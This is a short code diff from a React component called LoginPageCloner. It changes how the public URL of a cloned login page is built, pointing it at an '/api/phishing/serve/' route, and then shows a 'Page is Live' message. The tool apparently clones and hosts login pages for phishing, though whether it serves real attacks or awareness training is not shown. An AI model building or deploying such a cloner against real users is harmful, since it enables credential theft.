@@ -73,7 +73,8 @@ export function LoginPageCloner() {
     setClonerError(null);
     try {
       const response = await hostClonedPage({ htmlContent: clonedHtml });
-      setFullHostedUrl(response.publicUrl);
+      const publicUrl = `${window.location.origin}/api/phishing/serve/${response.pasteId}`;
+      setFullHostedUrl(publicUrl);
       toast({ title: "Page is Live", description: "Your page is now accessible at the public URL." });
     } catch (err) {
        const errorMessage = err instanceof Error ? err.message : 'An unknown error occurred.';
